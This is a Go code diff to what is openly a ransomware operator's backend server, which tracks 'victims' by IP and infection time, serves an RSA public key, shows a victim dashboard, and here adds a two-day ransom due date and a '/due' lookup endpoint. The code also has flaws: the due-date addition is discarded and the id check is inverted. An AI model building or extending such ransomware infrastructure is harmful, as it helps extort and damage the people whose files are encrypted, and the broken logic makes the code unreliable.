@@ -8,6 +8,7 @@ import (
 	"log"
 	"net/http"
 	"os"
+	"time"
 
 	"github.com/joho/godotenv"
 	"gorm.io/driver/postgres"
@@ -18,6 +19,14 @@ var db *gorm.DB
 
 func GiveTransactionID(w http.ResponseWriter, r *http.Request) {
 	w.Write([]byte("your transaction id"))
+}
+
+// takes in the starting time of the ransom and adds 2 days to it.
+func getDueDate(timestamp int64) int64 {
+	tm := time.Unix(timestamp, 0)
+	tm.Add(time.Hour * 24 * 2)
+
+	return tm.Unix()
 }
 
 type victimHtmlDisplay struct {
@@ -60,6 +69,7 @@ type Victim struct {
 	IP        string `json:"ip"`
 	Timestamp int64  `json:"timestamp"` // A timestamp of the infection
 	Completed bool   `json:"completed"` // A indicator if the transaction has been payed.
+	DueDate   int64  `json:"due_date"`  // timestamp but with two days added
 }
 
 type newVictim struct {
@@ -96,11 +106,30 @@ func RegisterNewVictim(w http.ResponseWriter, r *http.Request) {
 		Timestamp: victimData.Timestamp,
 		IP:        victimData.IP,
 		Completed: false,
+		DueDate:   getDueDate(victimData.Timestamp),
 	}
 
 	log.Printf("new victim registered, ID: %s, IP: %s", victim.UUID, victim.IP)
 	db.Create(victim)
 	w.WriteHeader(http.StatusOK)
+}
+
+func GetRansomwareDueDate(w http.ResponseWriter, r *http.Request) {
+	uuid := r.URL.Query().Get("id")
+	if uuid != "" {
+		http.Error(w, "no id query provided", http.StatusBadRequest)
+		return
+	}
+
+	var victim Victim
+	if err := db.Where(&Victim{UUID: uuid}).First(&victim).Error; err != nil {
+		http.Error(w, "victim data not found", http.StatusNotFound)
+		return
+	}
+
+	tm := time.Unix(victim.DueDate, 0)
+
+	w.Write([]byte(tm.String()))
 }
 
 func main() {
@@ -131,6 +160,7 @@ func main() {
 	http.HandleFunc("/pubkey", GetRSAPubKey)
 	http.HandleFunc("/register", RegisterNewVictim)
 	http.HandleFunc("/dashboard", ServeVictimsDisplay)
+	http.HandleFunc("/due", GetRansomwareDueDate)
 
 	if err := http.ListenAndServe("127.0.0.1:8080", nil); err != nil {
 		log.Fatalf("error while running listenandserver: %s", err.Error())
